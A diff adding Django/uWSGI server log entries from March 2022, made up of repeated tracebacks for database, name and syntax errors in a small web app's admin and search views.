+django.db.utils.OperationalError: no such table: mvc_userinfo
+2022-03-15 02:33:19,216 [uWSGIWorker1Core0:139621667514560] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-15 05:24:02,489 [uWSGIWorker1Core0:139648741718208] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.ProgrammingError: Cannot operate on a closed database.
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 88, in admin
+    data = adminadd(username, usercode, usertype)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 35, in adminadd
+    k=cursor.execute("select count(*) from django2_userinfo").fetchall()[0][0]
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.ProgrammingError: Cannot operate on a closed database.
+2022-03-15 05:24:41,875 [uWSGIWorker1Core0:139648741718208] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.ProgrammingError: Cannot operate on a closed database.
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 88, in admin
+    data = adminadd(username, usercode, usertype)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 35, in adminadd
+    k=cursor.execute("select count(*) from django2_userinfo").fetchall()[0][0]
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.ProgrammingError: Cannot operate on a closed database.
+2022-03-15 05:27:13,317 [uWSGIWorker1Core0:140701859297472] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.ProgrammingError: Cannot operate on a closed database.
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 88, in admin
+    data = adminadd(username, usercode, usertype)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 35, in adminadd
+    k=cursor.execute("select count(*) from appa_userinfo").fetchall()[0][0]
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.ProgrammingError: Cannot operate on a closed database.
+2022-03-15 05:27:29,010 [uWSGIWorker1Core0:140701859297472] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.ProgrammingError: Cannot operate on a closed database.
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 88, in admin
+    data = adminadd(username, usercode, usertype)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 35, in adminadd
+    k=cursor.execute("select count(*) from appa_userinfo").fetchall()[0][0]
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.ProgrammingError: Cannot operate on a closed database.
+2022-03-15 05:27:57,084 [uWSGIWorker1Core0:140701859297472] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.ProgrammingError: Cannot operate on a closed database.
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 88, in admin
+    data = adminadd(username, usercode, usertype)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 35, in adminadd
+    k=cursor.execute("select count(*) from appa_userinfo").fetchall()[0][0]
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.ProgrammingError: Cannot operate on a closed database.
+2022-03-15 05:28:41,096 [uWSGIWorker1Core0:140701859297472] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.ProgrammingError: Cannot operate on a closed database.
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 88, in admin
+    data = adminadd(username, usercode, usertype)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 35, in adminadd
+    k=cursor.execute("select count(*) from appa_userinfo").fetchall()[0][0]
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.ProgrammingError: Cannot operate on a closed database.
+2022-03-15 05:28:49,017 [uWSGIWorker1Core0:140701859297472] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.ProgrammingError: Cannot operate on a closed database.
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 88, in admin
+    data = adminadd(username, usercode, usertype)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 35, in adminadd
+    k=cursor.execute("select count(*) from appa_userinfo").fetchall()[0][0]
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.ProgrammingError: Cannot operate on a closed database.
+2022-03-15 05:29:52,995 [uWSGIWorker1Core0:140701859297472] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.ProgrammingError: Cannot operate on a closed database.
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 88, in admin
+    data = adminadd(username, usercode, usertype)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 35, in adminadd
+    k=cursor.execute("select count(*) from appa_userinfo").fetchall()[0][0]
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.ProgrammingError: Cannot operate on a closed database.
+2022-03-15 05:37:13,488 [uWSGIWorker1Core0:140701859297472] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.ProgrammingError: Cannot operate on a closed database.
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 88, in admin
+    data = adminadd(username, usercode, usertype)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 35, in adminadd
+    k=cursor.execute("select count(*) from appa_userinfo").fetchall()[0][0]
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.ProgrammingError: Cannot operate on a closed database.
+2022-03-15 05:43:06,503 [uWSGIWorker1Core0:140711844026560] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /use/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 98, in use
+    data = serch(btime,etime)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 53, in serch
+    l=cursor.execute(sql)
+NameError: name 'cursor' is not defined
+2022-03-15 05:43:13,989 [uWSGIWorker1Core0:140711844026560] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /use/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 98, in use
+    data = serch(btime,etime)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 53, in serch
+    l=cursor.execute(sql)
+NameError: name 'cursor' is not defined
+2022-03-15 05:43:47,035 [uWSGIWorker1Core0:140709649311936] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /use/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.OperationalError: no such table: weixinbindtrend
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 99, in use
+    data = serch(btime,etime)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 54, in serch
+    l=cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.OperationalError: no such table: weixinbindtrend
+2022-03-15 05:44:10,318 [uWSGIWorker1Core0:140709649311936] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /use/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.OperationalError: no such table: weixinbindtrend
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 99, in use
+    data = serch(btime,etime)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 54, in serch
+    l=cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.OperationalError: no such table: weixinbindtrend
+2022-03-15 05:47:46,777 [uWSGIWorker1Core0:140005460129984] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /use/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 45
+    l=cursor.execute(sql)
+    ^
+SyntaxError: invalid syntax
+2022-03-15 05:51:48,399 [uWSGIWorker1Core0:140005460129984] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /http:/www.qq.com/404/search_children.js
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 590, in resolve
+    raise Resolver404({'path': path})
+django.urls.exceptions.Resolver404: {'path': 'http://www.qq.com/404/search_children.js'}
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/deprecation.py", line 117, in __call__
+    response = response or self.get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 49, in inner
+    response = response_for_exception(request, exc)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 57, in response_for_exception
+    response = debug.technical_404_response(request, exc)
+  File "/usr/local/lib64/python3.6/site-packages/django/views/debug.py", line 520, in technical_404_response
+    resolver_match = resolve(request.path)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/base.py", line 24, in resolve
+    return get_resolver(urlconf).resolve(path)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 45
+    l=cursor.execute(sql)
+    ^
+SyntaxError: invalid syntax
+2022-03-15 05:52:20,241 [uWSGIWorker1Core0:139882136721600] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /use/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
